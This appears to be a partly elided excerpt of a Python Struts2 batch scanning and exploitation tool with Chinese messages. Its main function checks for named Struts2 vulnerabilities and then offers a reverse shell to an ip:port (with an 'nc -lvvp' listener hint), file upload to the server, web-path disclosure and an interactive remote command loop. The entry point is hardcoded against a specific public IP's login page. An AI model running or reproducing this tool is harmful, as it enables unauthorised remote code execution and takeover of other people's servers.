...
def check_file(file_path):
    ...
    if os.path.exists(file_path):
        ...
        print("[ERROR] {file}文件不存在!".format(file=file_path))
        exit(0)
...
def check_int(name, t):
    ...
    try:
        ...
        print("[ERROR] 参数{name}必须为整数!".format(name=name))
        exit(0)
...
def scan_one(url, data=None, headers=None, encoding="UTF-8"):
    ...
    print('[*] ----------------results------------------'.format(url=url))
    if (not results) and (not is_quiet):
        print('[*] {url} 未发现漏洞'.format(url=url))
    for r in results:
        if r.startswith("ERROR:"):
            print('[ERROR] {url} 访问出错: {error}'.format(url=url, error=r[6:]))
        else:
            print('[*] {url} 存在漏洞: {name}'.format(url=url, name=r))
...
def main(info=None, version=None, url=None, file=None, name=None, data=None, header=None, encode=None, proxy=None, exec=None, reverse=None, upfile=None, uppath=None, quiet=None, timeout=None,
         workers=None, webpath=None):
    """Struts2批量扫描利用工具"""
    ...
    if name and url:
        ...
        if name not in s2_list:
            print("[ERROR] 暂不支持{name}漏洞利用".format(name=name))
            exit(0)
        s = s2_dict[name](url, data, header, encode)
        s.check()
        if not s.is_vul:
            print("[ERROR] 该URL不存在{name}漏洞".format(name=name))
        if webpath:
            if name in webpath_names:
                web_path = s.get_path()
                print("[*] {webpath}".format(webpath=web_path))
                exit(0)
            else:
                print("[ERROR] 漏洞{name}不支持获取WEB路径".format(name=name))
                exit(0)
        if reverse:
            if name in reverse_names:
                print("[*] 请在反弹地址处监听端口如: nc -lvvp 8080")
                if ':' not in reverse:
                    print("[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080")
                ip = reverse.split(':')[0].strip()
                port = reverse.split(':')[1].strip()
                s.reverse_shell(ip, port)
                exit(0)
            else:
                print("[ERROR] 漏洞{name}不支持反弹shell".format(name=name))
                exit(0)
        if upfile and uppath:
            if name in upload_names and check_file(upfile):
                ...
                if result is True:
                    ...
                    print("[ERROR] 文件上传失败! {error}".format(error=result[6:]))
                    exit(0)
                else:
                    print("[ERROR] 文件上传失败! \n{error}".format(error=result))
                    exit(0)
            else:
                print("[ERROR] 漏洞{name}不支持文件上传".format(name=name))
                exit(0)
        if exec:
            if name in exec_names:
                if name == "S2_052":
                    print("[+] 提示: S2_052命令执行无回显，可将结果写入文件访问")
                while True:
                    cmd = input('>>>')
                    result = s.exec_cmd(cmd)
                    print(result)
            else:
                print("[ERROR] 漏洞{name}不支持命令执行".format(name=name))
                exit(0)
        print(s.info)
        exit(0)
...
if __name__ == '__main__':
    try:
        main(url="https://210.35.191.226:8443/web/login/SysLogin.action")
